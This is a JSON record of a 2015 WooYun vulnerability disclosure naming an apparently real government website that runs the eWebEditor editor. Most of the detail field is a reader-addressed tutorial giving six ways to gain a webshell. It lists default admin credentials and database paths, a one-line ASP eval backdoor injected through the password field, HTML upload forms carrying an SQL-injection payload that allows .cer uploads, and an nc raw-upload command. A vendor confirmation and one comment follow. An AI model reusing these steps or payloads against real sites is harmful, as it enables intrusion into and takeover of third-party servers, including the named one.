{"id": 37285, "wybug_id": "wooyun-2015-0100056", "wybug_title": "某政府站跳过登陆后台浏览目录的漏洞以及ewebeditor漏洞", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "路人甲", "wybug_date": "2015-03-10 12:33", "wybug_open_date": "2015-04-24 12:34", "wybug_type": "后台弱口令", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全意识不足", "弱口令", "后台被猜解", "后台地址泄露", "内部系统对外"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-24：\t细节向公众公开  简要描述：  详细说明：  http://www.xgkjs.net.cn/webapp/sm_login.aspeWebEditor编辑器漏洞建议最好检测下admin_style.asp文件是否可以直接访问 直接到样式管理 默认后台地址：/ewebeditor/admin_login.asp 使用默认密码：admin/admin 或 admin/admin888 不行就默认数据库路径 eWebEditor/db/ewebeditor.mdb 或eWebEditor/db/%23ewebeditor.mdb 拿webshell方法第一种方法 登陆后台点击“样式管理”-选择新增样式 只写这几样 大家照做就行了 样式名称:chouxiaozi 随便写 路径模式：选择绝对路径 图片类型：gif|jpg|jpeg|bmpasp|asa|aaspsp|cer|cdx 这样我们可以上各种格式的木马 我们只要把木马改成添加的这些格式就可以了 上传路径：写上这个admin/ 或写/ 免的别人把UploadFile/目录删了 我们找不到马 内容路径：空 记得 图片限制：写上1000 免的上不了我们的asp木马 然后我们就可以提交了 就可以看到样式增加成功！ 然后我们按-返回样式管理 找到刚才添加的样式名称 然后按工具栏 在按新增工具栏 然后按-按钮设置 在可选按钮 选择插入图片然后按》 -然后保存设置 在返回样式管理-找到刚才添加的样式名称-按预览-这里回看到一个正方形的东西 我们点击 然后上传我们的刚才添加的格式的木马 拿webshell方法第二种方法 登陆后台，点击修改密码---新密码设置为 1\":eval request(\"choxiaozi\")’ 设置成功后，访问asp/config.asp文件即可，一句话木马被写入到这个文件里面了. 然后用一句话客户端连接 拿webshell方法第三种方法 ewebeditor不登陆也获得webshell 这就不多说了 大家去百度搜索 ewebeditor不登陆也获得webshell 下载教程看 拿webshell方法第四种方法 利用ewebeditor asp版 2.1.6 上传漏洞利用程序 首先先看eWebEditor/upload.asp 上传地址存在不 存在的话就把下面的代码保存为 H1>ewebeditor asp版 2.1.6 上传漏洞利用程序----</H1><br><br> <form action=\"这里写上传地址?action=save&type=IMAGE&style=luoye' union select S_ID,S_Name,S_Dir,S_CSS,S_UploadDir,S_Width,S_Height,S_Memo,S_IsSys,S_FileExt,S_FlashExt, [S_ImageExt]%2b'|cer',S_MediaExt,S_FileSize,S_FlashSize,S_ImageSize,S_MediaSize,S_StateFlag,S_DetectFromWord,S_InitMode,S_BaseUrl from ewebeditor_style where s_name='standard'and'a'='a\" method=post name=myform enctype=\"multipart/form-data\"> <input type=file name=uploadfile size=100><br><br> <input type=submit value=Fuck> </form> 改上传地址保存为chouxiaozi.HTM文件,打开可以直接上传CER文件,测试成功.上传后地址看源文件 就可以看到我们上传的路径和地址 拿webshell方法第五种方法 ewebeditor 鸡肋的上传漏洞 首先先看下ewebeditor/asp/upload.asp 上传地址存在不 存在就 把下面的代码 <form action=\"这里写上传地址?action=savetype=image&style=popup&cusdir=a.asp\" method=post name=myform enctype=\"multipart/form-data\"> <input type=file name=uploadfile size=100><br><br> <input type=submit value=upload> </form> 然后保存为chouxiaozi.html 打开可以直接上传gif文件,测试成功.上传后地址看源文件 就可以看到我们上传的路径和地址 拿webshell方法第六种方法 利用eWebEditor/upload.asp 抓包和nc上传 抓包cookies 参数 和文件的数据 然后保存成文本 比如chouxiaozi.txt 然后用编译C32asm 或等等编译工具 修改 然后用nc.exe 提交 命令nc -vv site 80<chouxiaozi.txt 不懂抓包和nc上传 百度搜索相关教程 回头说下有时候进了个网站后台-看到了eWebEditor编辑器 但是找不到eWebEditor目录地址 我们来点鼠标右键-查看源代码，找到仔细找eWebEditor的路径。   漏洞证明：  \n\n\n\n\n\n\n\n\n\n   修复方案：  1.建议更新编辑器   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-03-15 10:56 厂商回复： CNVD确认并复现所述情况，已经由CNVD通过网站公开联系方式（或以往建立的处置渠道）向网站管理单位（软件生产厂商）通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-09-18 20:17 |    \t\t尊-折戟 \t\t\t( 实习白帽子  |\t\t\t        Rank:53 漏洞数:17        | 与时俱进！=忘本)\t\t \n  很不错的思路，学习了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}